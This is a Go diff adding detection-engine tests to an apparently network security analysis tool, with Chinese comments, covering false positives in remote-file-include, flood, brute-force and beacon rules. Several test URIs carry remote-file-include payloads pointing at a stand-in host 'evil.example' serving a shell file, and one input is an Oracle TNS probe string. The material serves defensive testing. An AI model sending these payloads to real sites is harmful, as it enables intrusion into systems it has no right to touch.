@@ -1,9 +1,12 @@
 package detect
 
 import (
+	"fmt"
 	"strings"
 	"testing"
+	"time"
 
+	"netsa/internal/config"
 	"netsa/internal/model"
 )
 
@@ -118,4 +121,109 @@ func ruleIDs(hits []model.Hit) []string {
 		out = append(out, h.RuleID)
 	}
 	return out
+}
+
+// 生产环境发现的误报：同站点的 pdf.js 预览地址、二进制协议探测、App 过期令牌的 401、高速扫描。
+func TestProductionFalsePositives(t *testing.T) {
+	e, err := NewEngine("", 1)
+	if err != nil {
+		t.Fatal(err)
+	}
+	web := func(method, uri string, status int) []model.Hit {
+		return e.Inspect(&model.Event{Kind: model.KindWeb, SrcIP: "203.0.113.90", Host: "mg.hc-yun.com", Method: method, URI: uri, Status: status, Bytes: 5000, UA: "Mozilla/5.0"})
+	}
+	if h := hitIDs(web("GET", "/static/pdf/web/viewer.html?file=https://mg.hc-yun.com:443/group1/M00/0B/53/a.pdf", 200)); h["rfi"].RuleID != "" {
+		t.Errorf("本站的 pdf 预览地址不是远程文件包含: %+v", h["rfi"])
+	}
+	if h := hitIDs(web("GET", "/static/pdf/web/viewer.html?file=https://files.hc-yun.com/a.pdf", 200)); h["rfi"].RuleID != "" {
+		t.Errorf("同一主域名的地址不是远程文件包含: %+v", h["rfi"])
+	}
+	for _, uri := range []string{"/x.php?file=http://evil.example/shell.txt", "/x.php?file=http://mg.hc-yun.com@evil.example/s.txt", "/x.php?page=http://mg.hc-yun.com.evil.example/s.txt"} {
+		if _, ok := hitIDs(web("GET", uri, 200))["rfi"]; !ok {
+			t.Errorf("%s 应命中远程文件包含", uri)
+		}
+	}
+	// 二进制协议发往 HTTP 端口：只是协议探测（低危），不是空字节截断
+	hits := e.Inspect(&model.Event{Kind: model.KindWeb, SrcIP: "203.0.113.91", URI: "\x00m\x00\x00\x01\x00\x00\x00\x018\x01,(DESCRIPTION=(CONNECT_DATA=(CID=(PROGRAM=x))))", Status: 400})
+	if len(hits) != 1 || hits[0].RuleID != "proto-nonhttp" || hits[0].Name != "Oracle TNS协议探测" || hits[0].Severity > model.SevLow {
+		t.Errorf("二进制协议探测: %+v", hits)
+	}
+}
+
+// 高速扫描不是洪泛；集中打向一个目标的大量连接仍是洪泛。过期令牌的 401 不是暴力破解，Basic 认证与登录接口的 401 是。
+func TestBehaviorScanFloodAnd401(t *testing.T) {
+	th := config.Default().Detect.Thresholds
+	b := NewBehavior(th)
+	now := time.Now()
+	fired := func(src string, evs func(i int) *model.Event, n int) map[string]bool {
+		out := map[string]bool{}
+		for i := 0; i < n; i++ {
+			ev := evs(i)
+			ev.SrcIP, ev.Time = src, now.Add(time.Duration(i)*time.Millisecond*50)
+			for _, h := range b.Observe(ev) {
+				out[h.RuleID] = true
+			}
+		}
+		return out
+	}
+	scan := fired("79.124.58.130", func(i int) *model.Event {
+		return &model.Event{Kind: model.KindFirewall, DstIP: fmt.Sprintf("43.242.97.%d", 30+i%20), DstPort: 1024 + i*7%60000, Action: model.ActionAllow}
+	}, th.FloodEvents+10)
+	if scan["bhv-flood"] || !scan["bhv-portscan"] {
+		t.Errorf("高速扫描应判为端口扫描而不是洪泛: %v", scan)
+	}
+	flood := fired("198.51.100.66", func(i int) *model.Event {
+		return &model.Event{Kind: model.KindFirewall, DstIP: "43.242.97.38", DstPort: 443, Action: model.ActionAllow}
+	}, th.FloodEvents+10)
+	if !flood["bhv-flood"] {
+		t.Errorf("集中打向一个目标应判为洪泛: %v", flood)
+	}
+	paths := []string{"/message/api/bulletins", "/uaa/api/app-menus/homepage", "/uaa/api/users/current", "/base/api/app-patches"}
+	app := fired("223.160.231.63", func(i int) *model.Event {
+		return &model.Event{Kind: model.KindWeb, Method: "GET", URI: paths[i%len(paths)], Status: 401}
+	}, 40)
+	if app["bhv-webbrute"] {
+		t.Errorf("过期令牌的 401 不是暴力破解: %v", app)
+	}
+	basic := fired("198.51.100.67", func(i int) *model.Event {
+		return &model.Event{Kind: model.KindWeb, Method: "GET", URI: "/admin/", Status: 401, User: fmt.Sprintf("user%d", i)}
+	}, 40)
+	if !basic["bhv-webbrute"] {
+		t.Errorf("Basic 认证反复失败应判为暴力破解: %v", basic)
+	}
+}
+
+// 周期性外连：ICMP 定时 ping 与多台主机同规律连接同一地址（统一部署的代理）降为低危，单台主机的 TCP 心跳仍为中危。
+func TestBeaconNoiseReduced(t *testing.T) {
+	th := config.Default().Detect.Thresholds
+	b := NewBehavior(th)
+	now := time.Now()
+	beacon := func(src, dst string, port int, proto string) []model.Hit {
+		var out []model.Hit
+		for i := 0; i < th.BeaconConns+2; i++ {
+			ev := &model.Event{Kind: model.KindFirewall, SrcIP: src, DstIP: dst, DstPort: port, Proto: proto, Action: model.ActionAllow,
+				Outbound: true, Time: now.Add(time.Duration(i) * 5 * time.Minute)}
+			out = append(out, b.Observe(ev)...)
+		}
+		return out
+	}
+	sev := func(hits []model.Hit) model.Severity {
+		for _, h := range hits {
+			if h.RuleID == "bhv-beacon" {
+				return h.Severity
+			}
+		}
+		return -1
+	}
+	if s := sev(beacon("10.0.0.50", "198.51.100.80", 443, "tcp")); s != model.SevMedium {
+		t.Errorf("单台主机的定时外连应为中危: %v", s)
+	}
+	if s := sev(beacon("10.0.0.51", "198.51.100.81", 2048, "icmp")); s != model.SevLow {
+		t.Errorf("定时 ping 应为低危: %v", s)
+	}
+	beacon("10.0.0.52", "34.120.177.193", 443, "tcp")
+	beacon("10.0.0.53", "34.120.177.193", 443, "tcp")
+	if s := sev(beacon("10.0.0.54", "34.120.177.193", 443, "tcp")); s != model.SevLow {
+		t.Errorf("第 3 台以同样规律连接同一地址的主机应为低危: %v", s)
+	}
 }
